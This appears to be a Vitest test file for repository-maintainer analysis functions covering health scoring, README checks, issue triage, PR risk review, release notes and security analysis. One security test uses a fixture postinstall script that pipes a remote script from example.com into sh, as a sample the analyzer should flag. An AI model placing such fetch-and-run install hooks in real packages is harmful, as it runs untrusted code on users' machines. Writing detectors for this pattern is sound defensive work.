import { describe, expect, it } from 'vitest'
import {
  analyzeReadme,
  analyzeRepoHealth,
  analyzeSecurity,
  generateReleasePlan,
  reviewPullRequest,
  triageIssue,
} from './maintainerEngines'

describe('maintainerEngines', () => {
  it('scores complete repo health higher than incomplete repo health', () => {
    const incomplete = analyzeRepoHealth({ readme: '# App' })
    const complete = analyzeRepoHealth({
      readme: '# App',
      license: true,
      contributing: true,
      codeOfConduct: true,
      securityPolicy: true,
      changelog: true,
      issueTemplates: true,
      pullRequestTemplate: true,
      ciWorkflow: true,
      lockfile: true,
    })

    expect(complete.score).toBeGreaterThan(incomplete.score)
    expect(complete.grade).toBe('A')
    expect(incomplete.signals.some((signal) => signal.severity === 'critical')).toBe(true)
  })

  it('detects weak README structure and missing sections', () => {
    const result = analyzeReadme('# Tiny\n\nSomething useful.')

    expect(result.score).toBeLessThan(70)
    expect(result.signals.some((signal) => signal.label === 'Missing README sections')).toBe(true)
  })

  it('triages security issues as high priority', () => {
    const result = triageIssue('Security vulnerability in token handling', 'A secret token appears in logs.')

    expect(result.labels).toContain('security')
    expect(result.priority).toBe('high')
  })

  it('flags auth PRs without tests as risky', () => {
    const result = reviewPullRequest('Change auth permissions', 'Updates token permission behavior', 'src/auth.ts')

    expect(result.risk).toBe('high')
    expect(result.mergeReadiness).toBeLessThan(50)
    expect(result.checklist.join(' ')).toContain('sensitive-data')
  })

  it('groups commits into release notes and suggests version bump', () => {
    const result = generateReleasePlan('feat: add issue triage\nfix: repair changelog grouping')

    expect(result.versionSuggestion).toBe('minor')
    expect(result.changelog).toContain('## Added')
    expect(result.changelog).toContain('## Fixed')
  })

  it('penalizes missing security policy and risky scripts', () => {
    const result = analyzeSecurity({
      packageJson: JSON.stringify({ scripts: { postinstall: 'curl https://example.com/install.sh | sh' } }),
    })

    expect(result.score).toBeLessThan(70)
    expect(result.signals.some((signal) => signal.severity === 'critical')).toBe(true)
  })
})
